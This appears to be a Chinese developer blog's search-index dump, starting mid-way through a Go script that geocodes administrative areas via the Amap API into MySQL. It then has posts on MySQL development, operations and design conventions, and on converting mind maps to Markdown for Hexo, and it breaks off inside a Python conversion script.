default:1&quot;`    Longitude     float64 `json:&quot;longitude&quot; gorm:&quot;column:longitude; type:decimal(10); default:NULL&quot;`    Latitude      float64 `json:&quot;latitude&quot; gorm:&quot;column:latitude; type:decimal(10); default:NULL&quot;`&#125;// TableName  return table namefunc (Area) TableName() string &#123;    return &quot;tbl_area&quot;&#125;// GetAreaMapByIDS 根据地区id获取 map[id]area结构func GetAreaMapByIDS(db *gorm.DB, IDS []int) (map[int]Area, error) &#123;    var res []Area    r := db.Model(&amp;Area&#123;&#125;).Where(&quot;id in (?)&quot;, IDS).Find(&amp;res)    if r.Error != nil &#123;        return nil, r.Error    &#125;    areaMap := make(map[int]Area)    for _, val := range res &#123;        areaMap[val.ID] = Area&#123;            ID:        val.ID,            Name:      val.Name,            Code:      val.Code,            Pcode:     val.Pcode,            Level:     val.Level,            Longitude: val.Longitude,            Latitude:  val.Latitude,        &#125;    &#125;    return areaMap, nil&#125;// GetAreaNameMapByCodeS 根据地区code获取 mapd[code]name 结构func GetAreaNameMapByCodeS(db *gorm.DB, codeS []int64) (map[int64]string, error) &#123;    var res []Area    r := db.Model(&amp;Area&#123;&#125;).Where(&quot;code in (?)&quot;, codeS).Find(&amp;res)    if r.Error != nil &#123;        return nil, r.Error    &#125;    areaMap := make(map[int64]string)    for _, val := range res &#123;        areaMap[val.Code] = val.Name    &#125;    return areaMap, nil&#125;// GetProvinceNameMapByCodeS 根据省code获取 map[id]name 结构func GetProvinceNameMapByCodeS(db *gorm.DB, codeS []int64) (map[int64]string, error) &#123;    var res []Area    r := db.Model(&amp;Area&#123;&#125;).Where(&quot;code in (?)&quot;, codeS).Find(&amp;res)    if r.Error != nil &#123;        return nil, r.Error    &#125;    areaMap := make(map[int64]string)    for _, val := range res &#123;        areaMap[val.ProvinceCode] = val.Name    &#125;    return areaMap, nil&#125;// GetCityNameMapByCodeS 根据市code获取 map[id]name 结构func GetCityNameMapByCodeS(db *gorm.DB, codeS []int64) (map[int64]string, error) &#123;    var res []Area    r := db.Model(&amp;Area&#123;&#125;).Where(&quot;code in (?)&quot;, codeS).Find(&amp;res)    if r.Error != nil &#123;        return nil, r.Error    &#125;    areaMap := make(map[int64]string)    for _, val := range res &#123;        areaMap[val.CityCode] = val.Name    &#125;    return areaMap, nil&#125;// GetAreaNameMapByCodeS2 根据区县code获取 map[id]name 结构func GetAreaNameMapByCodeS2(db *gorm.DB, codeS []int64) (map[int64]string, error) &#123;    var res []Area    r := db.Model(&amp;Area&#123;&#125;).Where(&quot;code in (?)&quot;, codeS).Find(&amp;res)    if r.Error != nil &#123;        return nil, r.Error    &#125;    areaMap := make(map[int64]string)    for _, val := range res &#123;        areaMap[val.AreaCode] = val.Name    &#125;    return areaMap, nil&#125;// RequetForFile request for filefunc RequetForFile(url string) (string, error) &#123;    var bodyStr string    // Get the data    resp, err := http.Get(url)    if err != nil &#123;        return bodyStr, err    &#125;    defer resp.Body.Close()    body, err := ioutil.ReadAll(resp.Body)    if err != nil &#123;        return bodyStr, err    &#125;    bodyStr = string(body)    return bodyStr, nil&#125;func main() &#123;    var province string    var areaLevel string    var areaName string    var areaNick string    flag.StringVar(&amp;province, &quot;p&quot;, &quot;&quot;, &quot;省&quot;) //五级需要    flag.StringVar(&amp;areaLevel, &quot;l&quot;, &quot;&quot;, &quot;地区级别&quot;)    flag.StringVar(&amp;areaName, &quot;n&quot;, &quot;&quot;, &quot;地区级别名称&quot;)    flag.StringVar(&amp;areaNick, &quot;k&quot;, &quot;&quot;, &quot;地区级别名称别名&quot;)    // 解析    flag.Parse()    dsn := fmt.Sprintf(        &quot;%s:%s@tcp(%s)/%s?parseTime=True&amp;loc=Local&quot;,        LocalUser,        LocalPassword,        LocalHost,        LocalDatabase,    )    db, err := gorm.Open(mysql.Open(dsn), &amp;gorm.Config&#123;&#125;)    if err != nil &#123;        fmt.Println(err)    &#125;    var res []Area    //省、直辖市    //sqlStr := fmt.Sprintf(&quot;select * from %s where level=%s and longitude is null &quot;, Table, areaLevel)    //市    //sqlStr := fmt.Sprintf(&quot;select * from %s where level=%s and name not in(&#39;市辖区&#39;,&#39;省直辖县级行政区划&#39;,&#39;县&#39;) &quot;, Table, areaLevel)    //区、县    //sqlStr := fmt.Sprintf(&quot;select * from %s where level=%s  and name not in(&#39;市辖区&#39;) and longitude is null&quot;, Table, areaLevel)    //街道、镇    //sqlStr := fmt.Sprintf(&quot;select * from %s where level=%s  and  longitude is null&quot;, Table, areaLevel)    //社区、乡村    sqlStr := fmt.Sprintf(&quot;select * from %s where level=%s  and  longitude is null and province_code = %s&quot;, Table, areaLevel, province)    fmt.Println(&quot;--this is sqlstr--&quot;)    fmt.Println(sqlStr)    db.Raw(sqlStr).Scan(&amp;res)    pCodeList := make([]int64, 0, len(res))    // provinceList := make([]int64, 0, len(res))    cityList := make([]int64, 0, len(res))    areaList := make([]int64, 0, len(res))    for _, v := range res &#123;        cityTemp := ZeroFillByStr(strconv.FormatInt(v.CityCode, 10), 12, false)        cityTempInt, _ := strconv.ParseInt(cityTemp, 10, 64)        cityList = append(cityList, cityTempInt)        areaTemp := ZeroFillByStr(strconv.FormatInt(v.AreaCode, 10), 12, false)        areaTempInt, _ := strconv.ParseInt(areaTemp, 10, 64)        areaList = append(areaList, areaTempInt)        pCodeList = append(pCodeList, v.Pcode)    &#125;    pAreaMap, err := GetAreaNameMapByCodeS(db, pCodeList)    if err != nil &#123;        fmt.Println(err)        return    &#125;    fmt.Println(&quot;--this is p map--&quot;)    fmt.Println(pAreaMap)    provinceCode := ZeroFillByStr(province, 12, false)    tempInt, _ := strconv.ParseInt(provinceCode, 10, 64)    proAreaMap, err := GetProvinceNameMapByCodeS(db, []int64&#123;tempInt&#125;)    if err != nil &#123;        fmt.Println(err)        return    &#125;    cityAreaMap, err := GetCityNameMapByCodeS(db, cityList)    if err != nil &#123;        fmt.Println(err)        return    &#125;    areaMap, err := GetAreaNameMapByCodeS2(db, areaList)    if err != nil &#123;        fmt.Println(err)        return    &#125;    for _, val := range res &#123;        fmt.Println(val)        urlString := fmt.Sprintf(AmapApi, proAreaMap[val.ProvinceCode]+cityAreaMap[val.CityCode]+areaMap[val.AreaCode]+pAreaMap[val.Pcode]+val.Name, Key)        fmt.Println(&quot;---this is request url--&quot;)        fmt.Println(urlString)        bodyResp, err := RequetForFile(urlString)        if err != nil &#123;            fmt.Println(err)        &#125;        var dataInfo map[string]interface&#123;&#125;        var location string        if err := json.Unmarshal([]byte(bodyResp), &amp;dataInfo); err != nil &#123;            fmt.Println(err)        &#125;        fmt.Println(&quot;--this is resp---&quot;)        fmt.Println(dataInfo)        for idx, value := range dataInfo &#123;            if idx == &quot;status&quot; &#123;                if value.(string) != &quot;1&quot; &#123;                    return                &#125;            &#125;            if idx == &quot;geocodes&quot; &#123;                mapTemp := value.([]interface&#123;&#125;)                temp := mapTemp[0].(map[string]interface&#123;&#125;)                //  &amp;&amp; temp[&quot;level&quot;].(string) != LevelFour  &amp;&amp; temp[&quot;level&quot;].(string) != DevLevel                if temp[&quot;level&quot;].(string) != areaName &amp;&amp; temp[&quot;level&quot;].(string) != areaNick&#123;                    return                &#125;                location = temp[&quot;location&quot;].(string)            &#125;        &#125;        locationList := strings.Split(location, &quot;,&quot;)        fmt.Println(&quot;----this is location --&quot;)        updateSql := fmt.Sprintf(&quot;UPDATE %s SET longitude = %s, latitude = %s where id = %d &quot;, Table, locationList[0], locationList[1], val.ID)        fmt.Println(&quot;---this is sql str---&quot;)        fmt.Println(updateSql)        db.Exec(updateSql)        if db.Error != nil &#123;            fmt.Println(db.Error)        &#125;    &#125;&#125;const (    AmapApi       = &quot;https://restapi.amap.com/v3/geocode/geo?address=%s&amp;key=%s&quot;    LocalHost     = &quot;127.0.0.1&quot;    LocalDatabase = &quot;xxx&quot;    LocalPort     = &quot;3306&quot;    LocalUser     = &quot;xxx&quot;    LocalPassword = &quot;xxx&quot;    Key           = &quot;xxx&quot;)// ZeroFillByStr 字符串前置/后置补零func ZeroFillByStr(str string, resultLen int, reverse bool) string &#123;    if len(str) &gt; resultLen || resultLen &lt;= 0 &#123;        return str    &#125;    if reverse &#123;        return fmt.Sprintf(&quot;%0*s&quot;, resultLen, str) //不足前置补零    &#125;    result := str    for i := 0; i &lt; resultLen-len(str); i++ &#123;        result += &quot;0&quot;    &#125;    return result&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> coding </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>项目开发-数据库篇（开发规范）</title>
      <link href="/technique/15.html"/>
      <url>/technique/15.html</url>
      
        <content type="html"><![CDATA[<p>数据库开发规范</p><h3 id="数据库开发规范"><a href="#数据库开发规范" class="headerlink" title="数据库开发规范"></a>数据库开发规范</h3><ul><li><strong>SQL语句</strong><ul><li><p>避免使用双%号和like，搜索严禁左模糊或者全模糊</p></li><li><p>禁止使用不含字段列表的insert语句</p><p>如：insert into values (‘a’,’b’,’c’)；应使用insert into t(c1,c2,c3) values (‘a’,’b’,’c’)</p></li><li><p>insert into…values(XX),(XX),(XX)…。XX的值不要超过5000个。值过多虽然上线很很快，但会引起主从同步延迟。</p></li><li><p>禁止使用order by rand（）进行随机排序</p></li><li><p>减少使用order by，和业务沟通能不排序就不排序，或将排序放到程序端去做。order by、group by、distinct这些语句较为耗费CPU，数据库的CPU资源是极其宝贵的。</p></li><li><p>order by、group by、distinct这些SQL尽量利用索引直接检索出排序好的数据。如where a&#x3D;1 order by可以利用key(a,b)</p></li><li><p>包含了order by、group by、distinct这些查询的语句，where条件过滤出来的结果集建议保持在1000行以内，否则SQL会很慢。</p></li><li><p>禁用update|delete t1 … where a&#x3D;XX limit XX; 这种带limit的更新语句。因为会导致主从不一致，导致数据错乱。建议加上order by PK</p></li><li><p>禁用insert into …on duplicate key update…在高并发环境下</p></li><li><p>尽量避免in操作，若实在避免不了，需要仔细评估in后边的集合元素数量，控制在1000个之内</p></li><li><p>禁止where从句中对列进行函数转换和计算</p><p>如：where date（createtime）&#x3D;‘20160901’ 会无法使用createtime列上索引。改成 where createtime&gt;&#x3D;’20160901’ and createtime &lt;’20160902’）</p></li><li><p>尽量避免使用子查询，可以把子查询优化为join操作</p><p>通常子查询在in子句中，且子查询中为简单SQL(不包含union、group by、order by、limit从句)时，才可以把子查询转化为关联查询进行优化。</p><p>子查询性能差的原因：</p><ol><li>子查询的结果集无法使用索引，通常子查询的结果集会被存储到临时表中，不论是内存临时表还是磁盘临时表都不会存在索引，所以查询性能会受到一定的影响；</li><li>特别是对于返回结果集比较大的子查询，其对查询性能的影响也就越大；</li><li>由于子查询会产生大量的临时表也没有索引，所以会消耗过多的CPU和IO资源，产生大量的慢查询。</li></ol></li><li><p>避免使用select * 查询</p><p>消耗更多的cpu和io及网络带宽资源，无法使用覆盖索引，可减少表结构变更带来的影响（表字段一旦更新，但model层没有来得及更新的话，系统会报错）</p></li><li><p>避免数据类型的隐式转换</p><p>隐式转换会导致索引失效。如：select name,phone from customer where phone &#x3D; 111</p></li><li><p>对应同一列进行or判断时，使用in代替or</p><p>in的值不要超过500个in操作可以更有效的利用索引，or大多数情况下很少能利用到索引</p></li><li><p>在明显不会有重复值时使用UNION ALL而不是UNION，并且UNION子句个数限制在5个以内</p><p>UNION会把两个结果集的所有数据放到临时表中后再进行去重操作；UNION ALL不会再对结果集进行去重操作</p></li><li><p>拆分复杂的大SQL为多个小SQL</p><p>大SQL逻辑上比较复杂，需要占用大量CPU进行计算的SQL；MySQL中，一个SQL只能使用一个CPU进行计算；SQL拆分后可以通过并行执行来提高处理效率</p></li><li><p>避免使用JOIN关联太多的表<br>对于Mysql来说，是存在关联缓存的，缓存的大小可以由join_buffer_size参数进行设置。</p><p>在Mysql中，对于同一个SQL多关联（join）一个表，就会多分配一个关联缓存，如果在一个SQL中关联的表越多，所占用的内存也就越大。</p><p>如果程序中大量的使用了多表关联的操作，同时join_buffer_size设置的也不合理的情况下，就容易造成服务器内存溢出的情况，就会影响到服务器数据库性能的稳定性。</p><p>同时对于关联操作来说，会产生临时表操作，影响查询效率Mysql最多允许关联61个表，建议不超过3个。</p></li><li><p>在多表join中，尽量选取结果集较小的表作为驱动表，来join其他表。</p></li><li><p>事务里批量更新数据需要控制数量，进行必要的sleep，做到少量多次。</p></li><li><p>事务里包含SQL不超过5个（支付业务除外）。因为过长的事务会导致锁数据较久，MySQL内部缓存、连接消耗过多等雪崩问题。</p></li><li><p>事务里更新语句尽量基于主键或unique key，如update … where id&#x3D;XX; 否则会产生间隙锁，内部扩大锁定范围，导致系统性能下降，产生死锁。</p></li><li><p>尽量把一些典型外部调用移出事务，如调用webservice，访问文件存储等，从而避免事务过长。</p></li><li><p>事务涉及的表必须全部是innodb表。否则一旦失败不会全部回滚，且易造成主从库同步终端。</p></li><li><p>除静态表或小表（100行以内），DML语句必须有where条件，且使用索引查找。</p></li><li><p>生产环境禁止使用hint，如sql_no_cache，force index，ignore key，straight join等。因为hint是用来强制SQL按照某个执行计划来执行，但随着数据量变化无法保证自己当初的预判是正确的，因此要相信MySQL优化器。</p></li><li><p>减少使用or语句，可将or语句优化为union，然后在各个where条件上建立索引。如where a&#x3D;1 or b&#x3D;2优化为where a&#x3D;1… union …where b&#x3D;2, key(a),key(b)。</p></li><li><p>分页查询，当limit起点较高时，可先用过滤条件进行过滤。如select a,b,c from t1 limit 10000,20;优化为: select a,b,c from t1 where id&gt;10000 limit 20;</p></li><li><p>禁止在业务的更新类SQL语句中使用join，比如update t1 join t2…。</p></li><li><p>对于有auto_increment属性字段的表的插入操作，并发需要控制在200以内。</p></li><li></li></ul></li></ul><h3 id="数据库操作规范"><a href="#数据库操作规范" class="headerlink" title="数据库操作规范"></a>数据库操作规范</h3><ul><li><strong>数据库操作</strong><ul><li><p>禁止使用存储过程、视图、触发器、event</p></li><li><p>对于超过100W行的大表进行alter table，必须经过DBA审核，并在业务低峰期执行。因为alter table会产生表锁，期间阻塞对于该表的所有写入，对于业务可能会产生极大影响。</p></li><li><p>减少同数据库的交互次数</p><p>数据库更适合处理批量操作，合并多个相同的操作到一起，可以提高处理效率</p></li><li><p>超100万行的批量写（UPDATE、DELETE、INSERT）操作，要分批多次进行操作</p><p>主从环境中，大批量操作可能会造成严重的主从延迟，大批量的写操作一般都需要执行一定长的时间，而只有当主库上执行完成后，才会在其他从库上执行，所以会造成主库与从库长时间的延迟情况。</p><p>binlog日志为row格式时会产生大量的日志。大批量写操作会产生大量日志，特别是对于row格式二进制数据而言，由于在row格式中会记录每一行数据的修改，我们一次修改的数据越多，产生的日志量也就会越多，日志的传输和恢复所需要的时间也就越长，这也是造成主从延迟的一个原因。</p></li><li><p>对于大表使用pt-online-schema-change修改表结构</p><p>避免大表修改产生的主从延迟；避免在对表字段进行修改时进行锁表</p><p>对大表数据结构的修改一定要谨慎，会造成严重的锁表操作，尤其是生产环境，是不能容忍的。</p><p>pt-online-schema-change它会首先建立一个与原表结构相同的新表，并且在新表上进行表结构的修改，然后再把原表中的数据复制到新表中，并在原表中增加一些触发器。</p><p>把原表中新增的数据也复制到新表中，在行所有数据复制完成之后，把新表命名成原表，并把原来的表删除掉。</p></li><li><p>禁止为程序使用的账号赋予super权限</p><p>当达到最大连接数限制时，还运行1个有super权限的用户连接super权限只能留给DBA处理问题的账号使用。</p></li><li><p>对于程序连接数据库账号，遵循权限最小原则</p><p>程序使用数据库账号只能在一个DB下使用，不准跨库，程序使用的账号原则上不准有drop权限。</p></li><li><p>程序连接不同的数据库使用不同的账号，禁止跨库查询</p><p>为数据库迁移和分库分表留出余地</p><p>降低业务耦合度</p><p>避免权限过大而产生的安全风险</p></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> coding </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>项目开发-数据库篇（设计规范）</title>
      <link href="/technique/14.html"/>
      <url>/technique/14.html</url>
      
        <content type="html"><![CDATA[<p>在项目开发中，数据库的设计规范性是项目协调、团队合作的前提。例如，数据库中表、字段统一命名规范，在设计合理的同时增加数据库的可维护性。</p><h3 id="数据库命名规范"><a href="#数据库命名规范" class="headerlink" title="数据库命名规范"></a>数据库命名规范</h3><p>数据库、表及字段的命名，需要“见名知意”。与此同时，命名及字段的类型和注释也会影响由工具生成的数据库文档、接口文档等，因此，在数据库设计过程中，需要遵守约定的命名规范。(<a href="https://juejin.cn/post/6844903476946796551">数据库中的设计规范</a>)</p><ul><li><p><strong>可用字符</strong></p><p>数据库、表、字段等所有名称的可用字符范围为：A-Z，a-z，0-9和_下划线。数据库及表名均不允许使用数字，而字段名除特殊情况外不允许使用数字。</p><p>为了方便阅读和操作，数据库、表和字段名一般不使用关键字保留字。</p></li><li><p><strong>命名方式</strong></p><p>数据库、表、字段等所有名称需要清晰明了，使用含义对应的英文单词、英文短语或相应的缩写，禁止使用汉语拼音，且均使用单数名。</p><p>Oracle表、字段等名称统一使用大写，单词间用_下划线分隔；SQLServer数据库、表等名称采用Pascal命名法，字段名称采用Camel命名法，大小写字母混排；MySQL数据库、表、字段等名称统一使用小写，单词间用_下划线分隔。</p><p>临时库、表以temp为前缀，日期为后缀。备份表以bak为前缀，日期为后缀。</p><p>相关模块的表名与表名之间尽量体现join关系，如user表和user_login表。</p><p>一般分库名称命名格式是库通配名_编号，编号从0开始，比如user_001，以时间进行分库的名称格式是库通配名_时间。</p><ul><li>PS 命名方法</li></ul><blockquote><p>匈牙利命名法。由微软的一位匈牙利程序员Charles Simonyi提出，相对复杂，首字母小写，基本原则是：变量名＝属性＋类型＋对象描述，其中每一对象的名称都要求有明确含义，可以取对象名字全称或名字的一部分。匈牙利命名法主要在C或C++这种面向过程的程序语言中使用。</p></blockquote><blockquote><p>Camel命名法。即骆驼式命名法，首字母小写，采用该命名法的名称看起来就像骆驼的驼峰一样高低起伏。Camel命名法有两种形式：<br>第一种是混合使用大小写字母，例如englishName、fartherCode。在Java中，属性名和方法名一般都采用这种命名方式，在C#中只有属性名采用这种命名方式，SQLServer中字段的命名也采用这种方式。<br>第二种是单词之间加下划线，例如english_name、farther_code。Oracel和MySQL表、字段的命名都采用这种方式，不过Oracle全部使用大写字母，MySQL全部使用小写字母。在Java、C#，甚至是在JavaScript中，所有的常量，都使用这种命名方式，不过和Oracle表字段的命名方式一样要全部使用大写字母。</p></blockquote><blockquote><p>Pascal命名法。即帕斯卡命名法，与Camel命名法类似，不过是首字母大写。在C#中，类名和方法名一般采用这种命名方式，在Java中类名一般采用这种方式。SQLServer中数据库、表的命名也采用这种方式。</p></blockquote></li><li><p><strong>长度限制</strong></p><table><thead><tr><th>数据库</th><th>表名</th><th>字段名</th></tr></thead><tbody><tr><td>MySQL</td><td>64</td><td>64</td></tr><tr><td>SQLServer</td><td>128</td><td>128</td></tr><tr><td>Oracle</td><td>30</td><td>30</td></tr><tr><td>Acess</td><td>30</td><td>30</td></tr><tr><td>DB2</td><td>128</td><td>128</td></tr><tr><td>Informix</td><td>18</td><td>18</td></tr></tbody></table><p>若表名和字段名的长度在长度限制内，但是仍然过长，生成的相关类名变量名都不利于后期的编写，因此需要将表名和字段的最终长度控制在大约32个字符以内。同时，在名称超过一定字符就使用缩写。</p><p>缩写的规则一般为：<br>  字典中单词的缩写，eg：December -&gt; Dec ；<br>  删除单词中的重复字母和单词元音，eg：Error -&gt; Err</p></li></ul><h3 id="数据库设计规范"><a href="#数据库设计规范" class="headerlink" title="数据库设计规范"></a>数据库设计规范</h3><ul><li><p><strong>字符集（Character Set）和字符序（Collation）规范</strong></p><p>字符集：给定一系列字符并赋予对应的编码后，所有这些字符和编码对组成的集合。</p><p>字符序：指定数据集如何排序、及字符串间的比对规则。</p><p>即，字符集定义了可以使用的字符，对应的字符序定义了字符之间的关系（<a href="https://www.cnblogs.com/seasonhu/p/14994857.html">参考</a>）。并且字符序依赖字符集，eg：把gb18030_chinese_ci作为字符序，就要求字符集是gb18030，而不能是utf8mb4。</p><p>可以对表进行字符集的设置，也可以单独对某个字段进行字符集的设置，优先级从高到底可分为四种：服务器层、数据库层、表层、字段层，真正决定性因素是在字段层，如果没有指定则默认从上一层继承。</p><p>数据库、表、字段的字符序也可逐级覆盖，类似四种字符集设置方式间的优先级关系。</p><p>建议数据库和表的字符集统一为utf8（MySQL为utf8mb4，MySQL中的utf8，更准确的名字是utf8mb3，一个字符最多使用3个字节来存储），字符序则根据实际需求选择，不同字段可以使用不同字符序（eg：大小写敏感度不同）。</p><p>utf8是国际通用编码，几乎所有网络应用都使用了Unicode字符集。</p><p>数据库和表的字符集统一，兼容性更好，统一字符集可以避免由于字符集转换产生的乱码，不同的字符集进行比较前需要进行转换会造成索引失效。</p><p>针对MySQL字符集为utf8mb4时，具体讨论utf8mb4_0900_ai_ci和utf8mb4_general_ci。</p><p>utf8mb4_0900_ai_ci：中间的0900，它对应的是Unicode 9.0的规范，ai表示accent insensitivity，也就是“不区分音调”，而ci表示case insensitivity，也就是“不区分大小写”。</p><p>MySQL 8.0之后，utf8mb4对应的默认字符序不再像之前版本一样是是utf8mb4_general_ci，而是统一更新成了utf8mb4_0900_ai_ci。</p></li><li><p><strong>表设计规范</strong></p><ul><li><p>使用Innodb存储引擎，支持事务，行锁，高并发下性能更好</p><p>创建表时必须显式指定表存储引擎类型，如无特殊需求，一律为InnoDB。当需要使用除InnoDB&#x2F;MyISAM&#x2F;Memory以外的存储引擎时，必须通过DBA审核才能在生产环境中使用。因为Innodb表支持事务、行锁、宕机恢复、MVCC等关系型数据库重要特性，为业界使用最多的MySQL存储引擎。而这是其他大多数存储引擎不具备的，因此首推InnoDB。</p></li><li><p>表和字段都要有comment注释字段</p></li><li><p>关于主键，命名为 id，类型为 int 或 bigint，且为 auto_increment</p></li><li><p>尽量控制单表数据量的大小</p><p>建议控制在500W以内，过大会造成修改表结构，备份，恢复都会有很大的问题。可以用历史数据归档（应用于日志数据），分库分表（应用于业务数据）等手段来控制数据量大小</p></li><li><p>谨慎使用分区表。分区表在物理上表现为多个文件，在逻辑上表现为一个表。谨慎选择分区键，跨分区查询效率可能更低 建议采用物理分表的方式管理大数据</p></li><li><p>尽量做到冷热数据分离，减小表的宽度</p></li><li><p>禁止在表中建立预留字段。预留字段的命名不容易见名知意，存储类型无法确认，对预留字段的修改会对表进行锁定</p></li><li><p>禁止在数据库中存储图片，文件等大的二进制数据</p></li><li><p>禁止在线上做数据库压力测试</p></li><li><p>不得使用外键与级联，一切外键概念必须在应用层解决</p><p>外键与级联更新适用于单机低并发，不适合分布式、高并发集群；级联更新是强阻塞，存在数据库更新风暴的风险；外键影响数据库的插入速度。</p></li></ul></li><li><p><strong>字段设计规范</strong></p><ul><li><p>未确定长度字段varchar类型代替char类型</p></li><li></li><li><p>优先选择符合存储需要的最小的数据类型</p><p> 列的字段越大，建立索引时所需要的空间也就越大，这样一页中所能存储的索引节点的数量也就越少也越少，在遍历时所需要的IO次数也就越多， 索引的性能也就越差。</p><p> eg： 对于非负型的数据（如自增ID、整型IP）来说，要优先使用无符号整型来存储</p></li><li><p>尽可能把所有列定义为NOT NULL</p><p> 索引NULL列需要额外的空间来保存，所以要占用更多的空间；<br> 进行比较和计算时要对NULL值做特别的处理</p></li><li><p>尽量不要定义 DEFAULT 值</p><p> 因为业务逻辑下放到了数据库层面，这是一种隐式行为，不利于开发和维护</p></li><li><p>反范式设计</p><p> 当数据不怎么变化时，把经常需要 join 查询的字段，在其它表里冗余一份。如 username 属性在 user_account，user_login_log 等表里冗余一份，减少 join 查询。</p></li><li><p>使用TIMESTAMP（4个字节）或DATETIME类型（8个字节）存储时间</p><p> TIMESTAMP 存储的时间范围 1970-01-01 00:00:01 ~ 2038-01-19-03:14:07。<br> DATETIME：0001-01-01 00:00:00 – 9999-12-31 23:59<br> DATE：1000-01-01 – 9999-12-31</p><p> TIMESTAMP 占用4字节和INT相同，但比INT可读性高.</p><p> 超出TIMESTAMP取值范围的使用DATETIME类型存储。</p><p> 经常会有人用字符串存储日期型的数据（不正确的做法）：</p><p>  缺点1：无法用日期函数进行计算和比较</p><p>  缺点2：用字符串存储日期要占用更多的空间</p></li><li><p>同财务相关的金额类数据必须使用decimal类型</p><p> 非精准浮点：float,double  ；<br> 精准浮点：decimal</p><p> Decimal类型为精准浮点数，在计算时不会丢失精度。占用空间由定义的宽度决定，每4个字节可以存储9位数字，并且小数点要占用一个字节。可用于存储比bigint更大的整型数据。</p></li><li><p>避免使用ENUM类型</p><p> 修改ENUM值需要使用ALTER语句</p><p> ENUM类型的ORDER BY操作效率低，需要额外操作</p><p> 禁止使用数值作为ENUM的枚举值</p></li><li><p>避免使用TEXT、BLOB数据类型，最常见的TEXT类型可以存储64k的数据</p><p> 建议把BLOB或是TEXT列分离到单独的扩展表中</p><p> Mysql内存临时表不支持TEXT、BLOB这样的大数据类型，如果查询中包含这样的数据，在排序等操作时，就不能使用内存临时表，必须使用磁盘临时表进行。</p><p> 而且对于这种数据，Mysql还是要进行二次查询，会使sql性能变得很差，但是不是说一定不能使用这样的数据类型。</p><p> 如果一定要使用，建议把BLOB或是TEXT列分离到单独的扩展表中（垂直拆分到其他表里），查询时一定不要使用select * 而只需要取出必要的列，不需要TEXT列的数据时不要对该列进行查询。</p><p> TEXT或BLOB类型只能使用前缀索引</p><p> 因为MySQL对索引字段长度是有限制的，所以TEXT类型只能使用前缀索引，并且TEXT列上是不能有默认值的。</p></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> coding </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>思维导图在hexo页面展示</title>
      <link href="/technique/13.html"/>
      <url>/technique/13.html</url>
      
        <content type="html"><![CDATA[<p>这些天整理自己之前的产出，大多是思维导图，于是想让其优雅地在博客页面展示。</p><p>起先想到直接导出图片格式，在页面展示。但是节点和文字一多，清晰度和可操作性就大大降低。</p><p>接着考虑SVG格式，可以使用<a href="https://markmap.js.org/repl/">Try markmap</a>——markmap的在线工具，当然这个得先转换成Markdown格式</p><p>那就直接使用<a href="https://github.com/gera2ld/markmap">hexo-markmap插件</a>;O) </p><h3 id="processon思维导图导出"><a href="#processon思维导图导出" class="headerlink" title="processon思维导图导出"></a>processon思维导图导出</h3><p>processon支持将思维导图导出成POS文件（.pos）、Xmind文件（.xmind）以及FreeMind文件（.mm）</p><h3 id="思维导图转成Markdown"><a href="#思维导图转成Markdown" class="headerlink" title="思维导图转成Markdown"></a>思维导图转成Markdown</h3><p>可以利用现成的思维导图软件将思维导图导出成markdown<br>当然，像我一样没有安装这些软件的可以直接使用百度脑图。<br>不过，百度脑图导入的文件格式存在限制：<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/tech/naotu-upload.png" alt="百度脑图文件上传"><br>processon导出的思维导图，FreeMind文件（.mm）可以在百度脑图导入成功。<br>导入后，可以再导出为markdown格式的文件</p><p>ps：明明支持.xmind，但是笔者导入后思维导图显示乱码</p><blockquote><p>Github也有一些将思维导图转成markdown的程序，如下：</p></blockquote><p>POS文件和Xmind文件转成Markdown文件（Java）：<a href="https://github.com/NotInWine/xmind-to-md">Xmind-to-md</a></p><p>KityMinder文件转成Markdown文件（Python）：<a href="https://github.com/Ash-one/km2md">km2md</a></p><pre><code>import jsonclass Node:    def __init__(self,data,children:list):        self.data = data        self.text = &#39; &#39;+data[&#39;text&#39;]        self.children = []        for child in self.getchildren(children):            node = Node(child[&#39;data&#39;],child[&#39;children&#39;])            self.children.append(node)            def getchildren(self,children:list):        realchildren = []        for child in children:            if child != None:                realchildren.append(child)        return realchildrendef node2md(md,node:Node,layer:int):    if node.children is None:        return md    else:        for child in node.children:            md += &#39;#&#39;*layer+ child.text + &#39;\n&#39; + node2md(&#39;&#39;,child,layer+1)        layer += 1        return mdif __name__ == &#39;__main__&#39;:    path = &#39;xxx.km&#39;    md_path = &#39;xxx.md&#39;        with open(path, &#39;r&#39;) as f:        content = json.load(f)        root = Node(content[&#39;root&#39;][&#39;data&#39;],content[&#39;root&#39;][&#39;children&#39;])    md = &#39;#&#39; + root.text + &#39;\n&#39;    layer = 2    md = node2md(md,root,layer)    with open(md_path,&#39;w&#39;) as f2:        f2.write(md)    print(md)    print(&#39;ok,please check your md file&#39;)</code></pre><p>Xmind文件转成Markdown文件（Python）：<a href="https://github.com/LiWenGu/xmind-zen2markdown">XmindGenMarkdown</a></p><pre><code>import jsonfrom zipfile import ZipFileclass XmindFileParser:    content_json = &quot;content.json&quot;    xmindFileContent = [content_json]    markdown_file_content = &quot;&quot;    @classmethod    def parse(self, file_path):        file_content = self.__unzip(self, file_path)        file_json_content = self.__parse_json(file_content)        self.__parse_children(self, file_json_content)        self.__generat_file(self)    def __unzip(self, file_path):        with ZipFile(file_path) as xmind_file:            for f in xmind_file.namelist():                for key in self.xmindFileContent:                    if f == key:                        with xmind_file.open(f) as contentJsonFile:                            return contentJsonFile.read().decode(&#39;utf-8&#39;)    def __parse_json(file_content):        return json.loads(file_content)    def __parse_children(self, json_content):        root_topic = json_content[0][&quot;rootTopic&quot;]        cur_node = root_topic        self.__parse_node(self, cur_node, &quot;#&quot;)    &#39;&#39;&#39;    递归解析 children 节点    &#39;&#39;&#39;    def __parse_node(self, node, level):        self.markdown_file_content = self.markdown_file_content + &quot;\n&quot; + level + &quot; &quot; + node[&quot;title&quot;] + &quot;\n&quot;        if &quot;notes&quot; in node:            # TODO 内容 &quot;\n&quot; 需要替换为 &quot;  \n&quot;            content = node[&quot;notes&quot;][&quot;plain&quot;][&quot;content&quot;]            self.markdown_file_content = self.markdown_file_content + &quot;\n&quot; + 